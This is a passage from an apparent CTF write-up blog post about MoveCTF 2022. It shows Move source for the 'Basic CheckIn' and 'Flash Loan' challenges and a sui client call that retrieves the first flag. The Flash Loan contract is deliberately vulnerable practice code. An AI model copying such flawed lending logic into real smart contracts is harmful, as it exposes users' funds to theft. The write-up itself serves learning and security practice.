<!doctype html><html lang=en data-mode=dark><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>MoveCTF 2022 | 0x4ka5h's Blog</title><link rel=apple-touch-icon href=https://0x4ka5h.github.io/images/favicons/apple-touch-icon.png sizes=180x180><link rel=icon href=https://0x4ka5h.github.io/images/favicons/favicon-32x32.png sizes=32x32 type=image/png><link rel=icon href=https://0x4ka5h.github.io/images/favicons/favicon-16x16.png sizes=16x16 type=image/png><link rel=manifest href=https://0x4ka5h.github.io/images/favicons/manifest.json><link rel=icon href=https://0x4ka5h.github.io/images/favicons/favicon.ico><meta name=keywords content><meta name=description content=" My approch towards the CTF challanges "><meta itemprop=name content="MoveCTF 2022"><meta itemprop=description content=" My approch towards the CTF challanges "><meta itemprop=datePublished content="2022-11-08T07:34:48+08:30"><meta itemprop=dateModified content="2022-11-08T07:34:48+08:30"><meta itemprop=wordCount content="2047"><meta itemprop=image content="https://0x4ka5h.github.io/posts/movectf-2022/images/_card.png"><meta itemprop=keywords content=","><meta property="og:title" content="MoveCTF 2022"><meta property="og:description" content=" My approch towards the CTF challanges "><meta property="og:type" content="article"><meta property="og:url" content="https://0x4ka5h.github.io/posts/movectf-2022/"><meta property="og:image" content="https://0x4ka5h.github.io/posts/movectf-2022/images/_card.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-11-08T07:34:48+08:30"><meta property="article:modified_time" content="2022-11-08T07:34:48+08:30"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://0x4ka5h.github.io/posts/movectf-2022/images/_card.png"><meta name=twitter:title content="MoveCTF 2022"><meta name=twitter:description content=" My approch towards the CTF challanges "><meta name=twitter:site content="@0x4ka5h"><link rel=preload href=https://0x4ka5h.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin=anonymous as=style onload='this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://0x4ka5h.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin=anonymous></noscript><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Consolas" type=text/css media=all referrerpolicy=no-referrer><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Fira+Code" type=text/css media=all><style>body{font-family:consolas}code{font-family:fira code}code{tab-size:4}</style></head><body><script src=https://0x4ka5h.github.io/js/bootstrap.min.062c2e66b557cb779d59cedff7e0cc76e84beb665a1076e474e87d940be44245.js integrity="sha256-BiwuZrVXy3edWc7f9+DMduhL62ZaEHbkdOh9lAvkQkU=" crossorigin=anonymous></script><header><nav class="navbar top-app-bar top-app-bar-expand-lg fixed-top"><div class=container><button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<i class="fas fa-bars"></i>
</button><a class="navbar-brand me-3" href=https://0x4ka5h.github.io/>0x4ka5h's Blog</a>
<button class=navbar-social-share type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasSocialShare aria-controls=offcanvasSocialShare aria-label="Toggle social share">
<i class="fas fa-share-alt"></i></button><div class="offcanvas offcanvas-bottom surface" tabindex=-1 id=offcanvasSocialShare aria-labelledby=offcanvasSocialShare><div class=offcanvas-header><h3 class=offcanvas-title>Share</h3><button type=button class="btn btn-sm btn-outline-primary" data-bs-dismiss=offcanvas aria-label=Close>
<i class="fas fa-times"></i></button></div><div class=offcanvas-body><a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Twitter Share Button" target=_blank href="https://twitter.com/intent/tweet?title=MoveCTF%202022&url=https%3a%2f%2f0x4ka5h.github.io%2fposts%2fmovectf-2022%2f"><i class="fab fa-fw fa-twitter"></i> Twitter</a>
<a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Facebook Share Button" target=_blank href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2f0x4ka5h.github.io%2fposts%2fmovectf-2022%2f"><i class="fab fa-fw fa-facebook-f"></i> Facebook</a></div></div><button class=navbar-settings type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasSettings aria-controls=offcanvasSettings aria-label="Toggle settings">
<i class="fas fa-ellipsis-v"></i></button><div class="offcanvas offcanvas-end surface h-100" tabindex=-1 id=offcanvasSettings aria-labelledby=offcanvasSettings><div class=offcanvas-header><h3 class=offcanvas-title>Settings</h3><button type=button class="btn btn-sm btn-outline-primary" data-bs-dismiss=offcanvas aria-label=Close>
<i class="fas fa-times"></i></button></div><div class=offcanvas-body><section class=setting><form class="font-size-switcher-form row"><div class=col-auto><label for=fontSize class=form-label><i class="fas fa-fw fa-font"></i> Font Size</label></div><div class="col-auto ms-auto"><input type=range class=form-range min=-2 max=2 id=fontSize></div></form></section><section class="setting palettes"><form class=row><div class=col-auto><label><i class="fas fa-fw fa-palette"></i> Palette</label></div><div class="col-auto ms-auto"><a id=btnPalette class="btn btn-sm btn-outline-primary" role=button aria-label=palettePicker><i class="fas fa-eye-dropper"></i></a></div></form><div class="mt-2 d-flex visually-hidden" id=palettePicker><button type=button id=palette-blue aria-label=Blue class="btn btn-sm palette" data-palette=blue>
</button><button type=button id=palette-blue-gray aria-label="Blue Gray" class="btn btn-sm palette" data-palette=blue-gray>
</button><button type=button id=palette-brown aria-label=Brown class="btn btn-sm palette" data-palette=brown>
</button><button type=button id=palette-cyan aria-label=Cyan class="btn btn-sm palette" data-palette=cyan>
</button><button type=button id=palette-green aria-label=Green class="btn btn-sm palette" data-palette=green>
</button><button type=button id=palette-indigo aria-label=Indigo class="btn btn-sm palette" data-palette=indigo>
</button><button type=button id=palette-orange aria-label=Orange class="btn btn-sm palette" data-palette=orange>
</button><button type=button id=palette-pink aria-label=Pink class="btn btn-sm palette" data-palette=pink>
</button><button type=button id=palette-purple aria-label=Purple class="btn btn-sm palette" data-palette=purple>
</button><button type=button id=palette-red aria-label=Red class="btn btn-sm palette" data-palette=red>
</button><button type=button id=palette-teal aria-label=Teal class="btn btn-sm palette" data-palette=teal>
</button><button type=button id=palette-yellow aria-label=Yellow class="btn btn-sm palette" data-palette=yellow></button></div></section></div></div><div class="collapse navbar-collapse" tabindex=-1 id=navbarSupportedContent aria-labelledby=navbarSupportedContent><ul class="navbar-nav ms-auto"><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/archives/><i class="fas fa-fw fa-file-archive"></i>Archives</a></li><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/categories/><i class="fas fa-fw fa-folder"></i>Categories</a></li><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/tags/><i class="fas fa-fw fa-tags"></i>Tags</a></li><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/series/><i class="fas fa-fw fa-columns"></i>Series</a></li></ul></div></div></nav></header><main role=main class=container><div class="row content"><div class=col-lg-8><div class=container><nav class="row card component" aria-label=breadcrumb><div class=card-body><ol class=breadcrumb><li class=breadcrumb-item><a href=https://0x4ka5h.github.io/>Home</a></li><li class=breadcrumb-item><a href=https://0x4ka5h.github.io/posts/>Posts</a></li><li class="breadcrumb-item active">MoveCTF 2022</li></ol></div></nav><article class="row card component mb-4 post"><div class=post-panel-wrapper><div class="d-flex flex-column component rounded post-panel"><a id=sidebarToggler class="action d-none d-lg-block" role=button><i class="fas fa-fw fa-expand-alt" data-fa-transform=rotate-45></i></a></div></div><div class=card-body><h1 class="card-title my-3">MoveCTF 2022</h1><div class=post-meta><span class=post-date title="created on"><i class="fas fa-fw fa-calendar-alt"></i>Nov 8, 2022
</span><span class=post-reading-time title="reading time"><i class="fas fa-fw fa-coffee"></i>10 min read
</span><a href=https://0x4ka5h.github.io/categories/move/ class="badge rounded-pill text-white bg-primary post-taxonomy">Move</a><a href=https://0x4ka5h.github.io/categories/sui/ class="badge rounded-pill text-white bg-primary post-taxonomy">SUI</a><a href=https://0x4ka5h.github.io/categories/security/ class="badge rounded-pill text-white bg-primary post-taxonomy">Security</a><a href=https://0x4ka5h.github.io/categories/ctf/ class="badge rounded-pill text-white bg-primary post-taxonomy">CTF</a><a href=https://0x4ka5h.github.io/categories/smart-contract/ class="badge rounded-pill text-white bg-primary post-taxonomy">Smart Contract</a><a href=https://0x4ka5h.github.io/categories/web3/ class="badge rounded-pill text-white bg-primary post-taxonomy">Web3</a></div><div class="post-content mb-3"><br><br><br><p align=center width=100%><img width=33% src=files/logo2.png></p><br><br><br><p>Sup?!</p><p>Hey, there! long time no see ah? I forgot to tell you that now I&rsquo;m currently learning blokchain and its security. Recently, I tried to compete in MoveCTF which was organized by MoveBit, Ottersec and ChainFlag, sponsored by Mysten Labs(Sui). From the name we can understand that this ctf is conducted on Move langauge and the platform was Sui blockchain.</p><p>I&rsquo;m actually very new to Move (known for 3 days before CTF). Meanwhile, I&rsquo;m learning Aptos, later shockingly known that this ctf was based on sui blockchain. Literally, I&rsquo;ve been hurried up and learn sui in the period of ctf and try to compete. However, I tried to complete 3 out 4 ctf problems.</p><ol><li>Basic CheckIn - 100 pts</li><li>Flashloan - 200 pts</li><li>SimpleGame - 400 pts</li></ol><h2 id=basic-checkin>Basic CheckIn</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-rs data-lang=rs><span class=line><span class=cl><span class=n>module</span><span class=w> </span><span class=n>movectf</span>::<span class=n>checkin</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>event</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>tx_context</span>::<span class=p>{</span><span class=bp>Self</span><span class=p>,</span><span class=w> </span><span class=n>TxContext</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>struct</span> <span class=nc>Flag</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>copy</span><span class=p>,</span><span class=w> </span><span class=nb>drop</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>user</span>: <span class=nc>address</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>flag</span>: <span class=kt>bool</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>get_flag</span><span class=p>(</span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>event</span>::<span class=n>emit</span><span class=p>(</span><span class=n>Flag</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>user</span>: <span class=nc>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>flag</span>: <span class=nc>true</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>If we call the <code>get_flag</code> funtion, then the flag becomes true.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sui client --call --function get_flag --module checkin --package &lt;ProgramDeployedAddress&gt; --gas-budget <span class=m>1000</span>
</span></span></code></pre></div><p>Level completed.</p><h2 id=flash-loan>Flash Loan</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-rs data-lang=rs><span class=line><span class=cl><span class=n>module</span><span class=w> </span><span class=n>movectf</span>::<span class=n>flash</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>transfer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>tx_context</span>::<span class=p>{</span><span class=bp>Self</span><span class=p>,</span><span class=w> </span><span class=n>TxContext</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>object</span>::<span class=p>{</span><span class=bp>Self</span><span class=p>,</span><span class=w> </span><span class=n>ID</span><span class=p>,</span><span class=w> </span><span class=n>UID</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>balance</span>::<span class=p>{</span><span class=bp>Self</span><span class=p>,</span><span class=w> </span><span class=n>Balance</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>:: <span class=nc>coin</span>::<span class=p>{</span><span class=bp>Self</span><span class=p>,</span><span class=w> </span><span class=n>Coin</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>vec_map</span>::<span class=p>{</span><span class=bp>Self</span><span class=p>,</span><span class=w> </span><span class=n>VecMap</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>event</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>struct</span> <span class=nc>FLASH</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=nb>drop</span><span class=w> </span><span class=p>{}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>struct</span> <span class=nc>FlashLender</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>key</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>id</span>: <span class=nc>UID</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>to_lend</span>: <span class=nc>Balance</span><span class=o>&lt;</span><span class=n>FLASH</span><span class=o>&gt;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>last</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>lender</span>: <span class=nc>VecMap</span><span class=o>&lt;</span><span class=n>address</span><span class=p>,</span><span class=w> </span><span class=kt>u64</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>struct</span> <span class=nc>Receipt</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>flash_lender_id</span>: <span class=nc>ID</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>amount</span>: <span class=kt>u64</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>struct</span> <span class=nc>AdminCap</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>store</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>id</span>: <span class=nc>UID</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>flash_lender_id</span>: <span class=nc>ID</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>struct</span> <span class=nc>Flag</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>copy</span><span class=p>,</span><span class=w> </span><span class=nb>drop</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>user</span>: <span class=nc>address</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>flag</span>: <span class=kt>bool</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// creat a FlashLender
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>create_lend</span><span class=p>(</span><span class=n>lend_coin</span>: <span class=nc>Coin</span><span class=o>&lt;</span><span class=n>FLASH</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>to_lend</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>coin</span>::<span class=n>into_balance</span><span class=p>(</span><span class=n>lend_coin</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>object</span>::<span class=n>new</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>lender</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vec_map</span>::<span class=n>empty</span><span class=o>&lt;</span><span class=n>address</span><span class=p>,</span><span class=w> </span><span class=kt>u64</span><span class=o>&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>balance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>balance</span>::<span class=n>value</span><span class=p>(</span><span class=o>&amp;</span><span class=n>to_lend</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>vec_map</span>::<span class=n>insert</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>lender</span><span class=w> </span><span class=p>,</span><span class=n>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>),</span><span class=w> </span><span class=n>balance</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>flash_lender</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>FlashLender</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>to_lend</span><span class=p>,</span><span class=w> </span><span class=n>last</span>: <span class=nc>balance</span><span class=p>,</span><span class=w> </span><span class=n>lender</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>transfer</span>::<span class=n>share_object</span><span class=p>(</span><span class=n>flash_lender</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// get the loan
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>loan</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=bp>self</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w> </span><span class=n>amount</span>: <span class=kt>u64</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>)</span>: <span class=p>(</span><span class=n>Coin</span><span class=o>&lt;</span><span class=n>FLASH</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>Receipt</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>to_lend</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>to_lend</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=fm>assert!</span><span class=p>(</span><span class=n>balance</span>::<span class=n>value</span><span class=p>(</span><span class=n>to_lend</span><span class=p>)</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>amount</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>loan</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>coin</span>::<span class=n>take</span><span class=p>(</span><span class=n>to_lend</span><span class=p>,</span><span class=w> </span><span class=n>amount</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>receipt</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Receipt</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>flash_lender_id</span>: <span class=nc>object</span>::<span class=n>id</span><span class=p>(</span><span class=bp>self</span><span class=p>),</span><span class=w> </span><span class=n>amount</span><span class=w> </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>(</span><span class=n>loan</span><span class=p>,</span><span class=w> </span><span class=n>receipt</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// repay coion to FlashLender
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>repay</span><span class=p>(</span><span class=bp>self</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w> </span><span class=n>payment</span>: <span class=nc>Coin</span><span class=o>&lt;</span><span class=n>FLASH</span><span class=o>&gt;</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>coin</span>::<span class=n>put</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>to_lend</span><span class=p>,</span><span class=w> </span><span class=n>payment</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// check the amount in FlashLender is correct 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>check</span><span class=p>(</span><span class=bp>self</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w> </span><span class=n>receipt</span>: <span class=nc>Receipt</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>Receipt</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>flash_lender_id</span><span class=p>,</span><span class=w> </span><span class=n>amount</span>: <span class=nc>_</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>receipt</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=fm>assert!</span><span class=p>(</span><span class=n>object</span>::<span class=n>id</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>flash_lender_id</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=fm>assert!</span><span class=p>(</span><span class=n>balance</span>::<span class=n>value</span><span class=p>(</span><span class=o>&amp;</span><span class=bp>self</span><span class=p>.</span><span class=n>to_lend</span><span class=p>)</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>last</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// init Flash
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>fun</span><span class=w> </span><span class=n>init</span><span class=p>(</span><span class=n>witness</span>: <span class=nc>FLASH</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>cap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>coin</span>::<span class=n>create_currency</span><span class=p>(</span><span class=n>witness</span><span class=p>,</span><span class=w> </span><span class=mi>2</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>owner</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>flash_coin</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>coin</span>::<span class=n>mint</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=n>cap</span><span class=p>,</span><span class=w> </span><span class=mi>1000</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>create_lend</span><span class=p>(</span><span class=n>flash_coin</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>transfer</span>::<span class=n>transfer</span><span class=p>(</span><span class=n>cap</span><span class=p>,</span><span class=w> </span><span class=n>owner</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// get  the balance of FlashLender
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>balance</span><span class=p>(</span><span class=bp>self</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span><span class=w> </span>:<span class=kt>u64</span> <span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>*</span><span class=n>vec_map</span>::<span class=n>get</span><span class=p>(</span><span class=o>&amp;</span><span class=bp>self</span><span class=p>.</span><span class=n>lender</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// deposit token to FlashLender
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>deposit</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=bp>self</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w> </span><span class=n>coin</span>: <span class=nc>Coin</span><span class=o>&lt;</span><span class=n>FLASH</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
